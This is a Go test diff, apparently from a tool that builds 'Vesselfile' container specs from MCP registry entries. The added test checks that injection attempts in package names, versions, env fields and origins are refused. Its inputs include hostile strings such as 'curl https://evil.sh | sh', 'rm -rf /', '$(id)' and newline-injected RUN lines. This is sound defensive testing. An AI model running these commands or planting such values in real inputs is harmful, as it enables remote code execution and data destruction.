@@ -23,6 +23,47 @@ func TestVesselfile_NPM(t *testing.T) {
 	}
 }
 
+func TestVesselfile_RejectsInjectionInIdentifierAndVersion(t *testing.T) {
+	// A malicious MCP registry entry controls the identifier/version; they are
+	// rendered into shell-form RUN/FROM lines, so anything with a shell
+	// metacharacter, whitespace, or newline must be refused, not executed.
+	bad := []Source{
+		{Registry: NPM, Identifier: "x && curl https://evil.sh | sh"},
+		{Registry: NPM, Identifier: "x\nRUN curl https://evil.sh | sh"},
+		{Registry: PyPI, Identifier: "pkg; rm -rf /"},
+		{Registry: NPM, Identifier: "ok", Version: "1.0 && echo pwned"},
+		{Registry: OCI, Identifier: "img$(id)", Launch: []string{"run"}},
+		{Registry: NPM, Identifier: "pkg`whoami`"},
+	}
+	for _, src := range bad {
+		if _, err := Vesselfile(src); err == nil {
+			t.Errorf("Vesselfile accepted an injecting source %+v; want refusal", src)
+		}
+	}
+	// A legitimate scoped package with a normal version still works.
+	if _, err := Vesselfile(Source{Registry: NPM, Identifier: "@scope/pkg-name", Version: "1.2.3"}); err != nil {
+		t.Errorf("Vesselfile rejected a legitimate source: %v", err)
+	}
+	// A leading dash would be read as a flag by npm/pip.
+	if _, err := Vesselfile(Source{Registry: PyPI, Identifier: "-rrequirements.txt"}); err == nil {
+		t.Error("Vesselfile accepted a flag-like identifier -rrequirements.txt")
+	}
+	// The env name/default and origin are equally registry-controlled and land
+	// in ENV/SECRETS/META directives: a newline there injects a Vesselfile line.
+	badFields := []Source{
+		{Registry: NPM, Identifier: "ok", Env: []EnvVar{{Name: "X\nRUN curl evil|sh", Default: "y"}}},
+		{Registry: NPM, Identifier: "ok", Env: []EnvVar{{Name: "TOKEN", Default: "y\nEGRESS allow:*"}}},
+		{Registry: NPM, Identifier: "ok", Env: []EnvVar{{Name: "bad name", Default: "y"}}},
+		{Registry: NPM, Identifier: "ok", Origin: "reg:name\nFROM evil"},
+		{Registry: NPM, Identifier: "ok", Egress: []string{"host\nRUN evil"}},
+	}
+	for _, src := range badFields {
+		if _, err := Vesselfile(src); err == nil {
+			t.Errorf("Vesselfile accepted an injecting field in %+v; want refusal", src)
+		}
+	}
+}
+
 func TestVesselfile_EgressAllow(t *testing.T) {
 	got, err := Vesselfile(Source{
 		Registry:   PyPI,
